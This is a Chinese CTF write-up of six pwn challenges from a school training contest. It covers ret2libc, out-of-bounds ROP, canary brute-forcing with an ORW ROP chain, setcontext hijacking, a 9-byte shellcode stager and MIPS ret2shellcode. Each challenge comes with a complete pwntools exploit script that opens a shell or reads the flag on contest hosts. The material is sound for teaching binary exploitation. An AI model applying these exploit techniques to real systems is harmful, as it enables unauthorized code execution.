学校搞的训练赛，难度很适中

---

## 1、as a pwner

[scode type="blue" size=""]作为一个 pwner ，你一定知道 libc 是做什么的。[/scode]

一道 **ret2libc** 的签到题

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d3f9c4419e.png)

exp如下：

```python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# p = process('./pwn')
p = remote('yaemiko.node.bxs.team', 50257)
elf = ELF('./pwn')
libc = ELF('./libc.so.6')

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))
ret = 0x40101a
pop_rdi = 0x40123d
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x401206

p.recvuntil(b'libc:')
payload1 = b'A' * 0x108 + p64(ret) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload1)
p.recvuntil(b'Thank you\n')

leak = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'leak: {hex(leak)}')
libc_base = leak - libc.symbols['puts']
log.info(f'libc_base: {hex(libc_base)}')
system = libc_base + system
binsh = libc_base + binsh
log.info(f'system: {hex(system)}')
log.info(f'binsh: {hex(binsh)}')

p.recvuntil(b'libc:')
payload2 = b'A' * 0x108 + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendline(payload2)

p.interactive()
```

---

## 2、hacker

[scode type="blue" size=""]看起来很安全呢[/scode]

`hacker` 函数

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d42b9c3c2e.png)

有一个**OOB**漏洞，没有检查下界，于是可以直接**任意地址写**

`arr` 起始是 `[rbp-0x60]`，每个元素 8 字节

* `slot 0` -> `[rbp-0x60]`（arr[0]）
* **...**
* `slot 9` -> `[rbp-0x18]`（arr[9]）
* `slot 10` -> `[rbp-0x10]`
* `slot 11` -> `[rbp-0x8]`（canary）
* `slot 12` -> `[rbp+0x0]`（saved rbp）
* `slot 13` -> `[rbp+0x8]`（saved RIP）
* `slot 14+` -> 后续 ROP 链

我们直接从 `slot=13` 开始写，避免破坏 canary

因为只有一次 `hacker()`，但有 10 次写入，足够构造 ROP

后续可以打ret2libc，也可以直接ret2text

exp如下：

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# p = process("./pwn")
p = remote("yaemiko.node.bxs.team", 50403)
elf = ELF("./pwn")
libc = ELF("./libc.so.6")

ret = 0x400631
pop_rdi = 0x400A33
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.symbols["main"]

idx = lambda slot: slot - (1 << 63)

p.sendlineafter(b"Enter administrator's name:", b"admin")
writes1 = [
    (idx(13), ret),
    (idx(14), pop_rdi),
    (idx(15), puts_got),
    (idx(16), puts_plt),
    (idx(17), ret),
    (idx(18), main),
]
writes1 += [(0, 0)] * (10 - len(writes1))
for i, v in writes1:
    p.sendlineafter(b"Enter hacker index:", str(i).encode())
    p.sendlineafter(b"Enter hacker age:", str(v).encode())

p.recvuntil(b"Now let's see your creation:'\n")
p.recvuntil(b"0 0 0 0 0 0 0 0 0 0 ")
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
log.info(f"leak: {hex(leak)}")

libc_base = leak - libc.symbols["puts"]
log.info(f"libc_base: {hex(libc_base)}")
system = libc_base + libc.symbols["system"]
binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
exit_ = libc_base + libc.symbols["exit"]
log.info(f"system: {hex(system)}")
log.info(f"binsh: {hex(binsh)}")

p.sendlineafter(b"Enter administrator's name:", b"admin2")
writes2 = [
    (idx(13), ret),
    (idx(14), pop_rdi),
    (idx(15), binsh),
    (idx(16), system),
    (idx(17), exit_),
]
writes2 += [(0, 0)] * (10 - len(writes2))
for i, v in writes2:
    p.sendlineafter(b"Enter hacker index:", str(i).encode())
    p.sendlineafter(b"Enter hacker age:", str(v).encode())

p.interactive()
```

---

## 3、stack

[scode type="blue" size=""]永劫轮回[/scode]

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d45d9418b9.png)

main函数：

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d81155fc5a.png)

泄露了 `hint` 的真实地址，于是可以得到PIE基址

[font color="#1E90FF"]***leak - hint_offset = PIE_base***[/font]

检查通过，进入 `reincarnation`

检查一下沙箱

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d824ea3378.png)

系统调用被禁用，看来基本上是一道**ORW**读flag

看看 `reincarnation`

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d82ee4d467.png)

有一个fork，可以用来爆破Canary

`overflow` 函数：

```c
char buf[0x20];
read(0, buf, 0x50);
```

栈布局（从 `buf` 起算）：

- 到 canary 偏移：`0x18`
- canary：8 字节
- saved rbp：8 字节
- return address：8 字节

`read` 读 `0x50`，足够覆盖返回地址，但存在 canary 检查

单次溢出只能 0x50，不够塞完整 ORW ROP，所以可以先构造短链，把执行流跳到 `small_overflow+0x20`，复用函数内部 `read`，并提前把 `rdx` 改成 `0x400`

后续再进行一次栈迁移就可以布置 ORW ROP 了

exp：

```python
#!/usr/bin/env python3
from pwn import *
import re

context.log_level = "debug"
context.arch = "amd64"

p = remote("minori.node.bxs.team", 51774)

elf = ELF("./pwn")
libc = ELF("./libc.so.6")
context.binary = elf

OFFSET = 0x18
HINT = 0x14F1
READ_STAGE = 0x1547
POP_RAX = 0x1517
POP_RDI = 0x1519
POP_RSI_R15 = 0x151B
POP_RDX = 0x151F
SYSCALL = 0x1521
FAKE_RBP = 0x7000

data = p.recvuntil(b"prefix): ")
leak = int(re.search(rb"0x[0-9a-fA-F]+", data).group(), 16)
pie_base = leak - HINT
log.info(f"leak: {hex(leak)}")
log.info(f"pie_base: {hex(pie_base)}")
p.sendline(hex(pie_base)[2:].encode())

p.recvuntil(b"Hello Hacker!\n")

canary = b"\x00"
for i in range(1, 8):
    for guess in range(0x100):
        payload = b"A" * OFFSET + canary + p8(guess)
        p.send(payload)
        out = p.recvuntil(b"Hello Hacker!\n", timeout=1)
        if b"stack smashing detected" not in out:
            canary += p8(guess)
            log.success(f"canary[{i}] = {guess:02x}")
            break
    else:
        raise ValueError(f"canary brute force failed at byte {i}")
log.success(f"canary: {canary.hex()}")

fake_rbp = pie_base + FAKE_RBP
path_addr = fake_rbp + 0x300
buf_addr = fake_rbp + 0x340

pop_rax = pie_base + POP_RAX
pop_rdi = pie_base + POP_RDI
pop_rsi_r15 = pie_base + POP_RSI_R15
pop_rdx = pie_base + POP_RDX
syscall = pie_base + SYSCALL
read_stage = pie_base + READ_STAGE

payload1 = flat(
    b"A" * OFFSET,
    canary,
    p64(fake_rbp),
    p64(pop_rdx),
    p64(0x400),
    p64(read_stage),
).ljust(0x50, b"\x00")

rop = flat(
    p64(pop_rax),
    p64(3),
    p64(pop_rdi),
    p64(0),
    p64(syscall),
    p64(pop_rax),
    p64(2),
    p64(pop_rdi),
    p64(path_addr),
    p64(pop_rsi_r15),
    p64(0),
    p64(0),
    p64(pop_rdx),
    p64(0),
    p64(syscall),
    p64(pop_rax),
    p64(0),
    p64(pop_rdi),
    p64(0),
    p64(pop_rsi_r15),
    p64(buf_addr),
    p64(0),
    p64(pop_rdx),
    p64(0x80),
    p64(syscall),
    p64(pop_rax),
    p64(1),
    p64(pop_rdi),
    p64(1),
    p64(pop_rsi_r15),
    p64(buf_addr),
    p64(0),
    p64(pop_rdx),
    p64(0x80),
    p64(syscall),
    p64(pop_rax),
    p64(60),
    p64(pop_rdi),
    p64(0),
    p64(syscall),
)

payload2 = flat(
    b"B" * OFFSET,
    canary,
    p64(fake_rbp),
    rop,
)
payload2 = payload2.ljust(0x320, b"\x00") + b"./flag\x00"
payload2 = payload2.ljust(0x400, b"\x00")

p.send(payload1 + payload2)
p.interactive()

```

---

## 4、ctx

[scode type="blue" size=""]context？[/scode]

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d86228df45.png)

win函数：

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d877522466.png)

main函数：

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d87a308563.png)

程序核心调用了 `getcontext/setcontext`，这是本题利用入口，应该是 **setcontext 上下文劫持** 题型

先把合法上下文写入 `buf+0x40`

再把用户输入写到 `buf`（从 `buf+0x0` 开始）

因为读入 `0x100` 字节，所以会覆盖 `buf+0x40` 处 `ucontext` 的前 `0xc0` 字节

`setcontext` 使用被我们篡改的寄存器状态，达到控制 `RIP/RSP` 的效果

---

第一次做这种类型的题，顺便写点笔记

[scode type="yellow" size=""]

Linux/glibc 里的 `setcontext()` 是用户态上下文切换函数，和 `getcontext()/makecontext()/swapcontext()` 一套。`ucontext_t` 里至少包含：

* `uc_sigmask`（信号掩码）
* `uc_stack`（栈）
* `uc_mcontext`（机器寄存器上下文）

`setcontext()` 成功后**不会返回**，它会恢复你给它的上下文继续执行

在 glibc x86\_64 的 `setcontext.S` 里，可以看到它会从你提供的上下文里至少恢复这些关键值：

* `rsp`
* `rbx/rbp/r12-r15`（被调用者保存寄存器）
* `rdi/rsi/rdx/rcx/r8/r9`（参数寄存器）
* `rip`

源码里能看到明确的恢复序列，例如先取 `oRSP` 到 `%rsp`，再恢复若干寄存器，最后把 `oRIP` 压栈并 `ret`（或某些路径直接 `jmp *%r10`）

因此，只要我们能控制一次对 `setcontext()` 的调用，就相当于获得了 **批量写寄存器 + 栈迁移 + 控制 RIP** 的能力

[/scode]

我们还需要推导 `ucontext` 偏移

在 x86_64 glibc 下，有：

- `ucontext_t.uc_mcontext` 偏移是 `0x28`
- `gregs[REG_RSP]` 的 index 是 `15`
- `gregs[REG_RIP]` 的 index 是 `16`

题目里 `ucontext` 起始地址是 `buf+0x40`，因此输入数据中的关键偏移为：

- `RSP` 写入偏移 `0x40 + 0x28 + 15*8 = 0xe0`
- `RIP` 写入偏移
  `0x40 + 0x28 + 16*8 = 0xe8`

所以 payload 里只要改这两处即可：

1. `RIP = win (0x401370)`
2. `RSP = 可写地址`

这道题有win，可以直接读flag，因此不需要复杂的利用链

exp：

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

# p = process("./ctx")
p = remote("minori.node.bxs.team", 52121)
elf = ELF("./ctx")
libc = ELF("./lib/libc.so.6")

win = elf.symbols["win"]

uc_off = 0x40
mcontext_off = 0x28
gregs_off = uc_off + mcontext_off

reg_rsp = 15
reg_rip = 16
fake_rsp = 0x404808

payload = bytearray(0xF0)
payload[gregs_off + reg_rsp * 8 : gregs_off + reg_rsp * 8 + 8] = p64(fake_rsp)
payload[gregs_off + reg_rip * 8 : gregs_off + reg_rip * 8 + 8] = p64(win)

try:
    p.recvuntil(b"Give me your name:", timeout=2)
except EOFError:
    log.warning("no banner, send payload directly")
p.send(bytes(payload))

try:
    p.recvuntil(b"Here is your flag: ", timeout=5)
    flag = p.recvline().strip()
    log.success(f"flag: {flag.decode(errors='ignore')}")
except EOFError:
    log.failure("connection closed before flag")

p.interactive()

```

---

## 5、nine

安全机制

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d8c06edf39.png)

沙箱

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d8c4a80707.png)

除了orw和exit，其他系统调用都被禁止了

看一下main函数

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d8cacaa2cd.png)

函数先 `mmap` 了一页 `RWX` 内存，用 `read(0, mmap_addr, 9)` 读取 9 字节 shellcode，然后布置沙箱，最后返回shellcode

注意到main的汇编里有这么一段

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d8e8d47332.png)

在跳转到shellcode之前，几乎所有通用寄存器被**清零**

**因此初始状态可利用：**

* `rax=0`
* `rdi=0`
* `rdx=0`

**只需设置：**

* `rsi = shellcode地址`
* `rdx = 0xff`

即可执行 `read(0, rsi, 0xff)` 继续拉取二阶段

程序先 `push mmap_addr`，再 `ret` 到 `mmap_addr`。`ret` 会弹栈，但 **`[rsp-8]` 位置仍保留刚才的 `mmap_addr` 值**，所以可直接取出 shellcode 基址

stager 在 `mmap_addr` 执行 `syscall(read)` 后，RIP 会继续到 `mmap_addr+9`。

但我们第二次发送的数据默认从 `mmap_addr` 开始覆盖写入，所以如果不处理，会从二阶段第 0 字节开始写，而 CPU 会从 `+9` 处执行，导致错位。

解决：二阶段发送时前置 `9` 字节 `NOP`，让 `mmap_addr+9` 正好落在真正 ORW 代码开头

```
mov rsi, [rsp-8]
mov dl, 0xff
syscall
```

刚好9字节

exp如下：

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"

# p = process("./pwn")
p = remote("minori.node.bxs.team", 50557)
elf = ELF("./pwn")

payload1 = asm(
    """
    mov rsi, [rsp-8]
    mov dl, 0xff
    syscall
    """
)
assert len(payload1) == 9

orw = asm(
    """
    lea rdi, [rip+path1]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall
    test eax, eax
    jns got_fd

    lea rdi, [rip+path2]
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

got_fd:
    mov edi, eax
    mov rsi, rsp
    mov edx, 0x100
    xor eax, eax
    syscall

    mov edx, eax
    mov edi, 1
    mov eax, 1
    syscall

    xor edi, edi
    mov eax, 60
    syscall

path1:
    .asciz "flag"
path2:
    .asciz "/flag"
    """
)
payload2 = b"\x90" * 9 + orw

p.recvuntil(b"Give me your shellcode (max 9 bytes): ")
p.send(payload1)
p.send(payload2)
p.interactive()
```

[font color="#FF1493"]**另一种思路**[/font]

群里有师傅说其实可以只用八字节，即

```
mov esi, [rsp-8]
mov dl, 0xff
syscall
```

这个没测试过，理论上讲应该可行，但9字节会更稳定一点

---

## 6、什么？Mips？

[scode type="blue" size=""]这来自*2025年浙江省大学生网络与信息安全竞赛决赛*，qemu等环境配置可参考下面这位师傅的文章➡️[异架构pwn学习入门](https://sysnow.xyz/blog/cross_architecture_introduction/)[/scode]

简单写一下环境配置

**安装qemu**

```
sudo apt install qemu-user
```

**安装gdb-multiarch**

```
sudo apt install gdb-multiarch
```

**安装交叉编译工具链**

[scode type="red" size=""]kali的镜像源里面没有这个东西，不安装不影响做题，Ubuntu可以正常安装[/scode]

```
sudo apt install gcc-mips-linux-gnu
```

如果要调试

在终端运行：

```bash
qemu-mips -g 1234 ./mips
```

在另一个终端运行：

```bash
gdb-multiarch ./mips
pwndbg> target remote :1234
```

---

安全机制

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d9622a47b4.png)

主要函数是vuln
![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d96813147b.png)

读取输入后，会把 `v1`的地址打印出来

![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d990649c2f.png)

我们需要找到 `$ra`寄存器的地址和偏移![请输入图片描述](https://free.picui.cn/free/2026/02/24/699d99f049413.png)

可以发现偏移是**44**

我们可以把shellcode布置在**偏移48**的位置，本质上是一道常规的ret2shellcode

exp：

```
from pwn import *

context.arch = 'mips'
context.endian = 'big'
context.os = 'linux'
context.log_level = 'debug'
# p = process(['qemu-mips', '-g', '1234', './mips']) 
# p = process(['qemu-mips', './mips'])
p = remote("yaemiko.node.bxs.team", 51988)

p.recvuntil(b"input number of magic")
p.sendline(b"255")

p.recvuntil(b"gift: ")
v1_addr = int(p.recvline().strip(), 16)
log.success(f"v1 Address: {hex(v1_addr)}")

shellcode_addr = v1_addr + 48
log.info(f"Target Jump Address: {hex(shellcode_addr)}")

shellcode = asm(shellcraft.mips.linux.sh())
padding_len = 44
padding = b'A' * padding_len
payload = flat([
    padding,  
    shellcode_addr,  
    shellcode  
])
sleep(0.1)
p.send(payload)

p.interactive()
```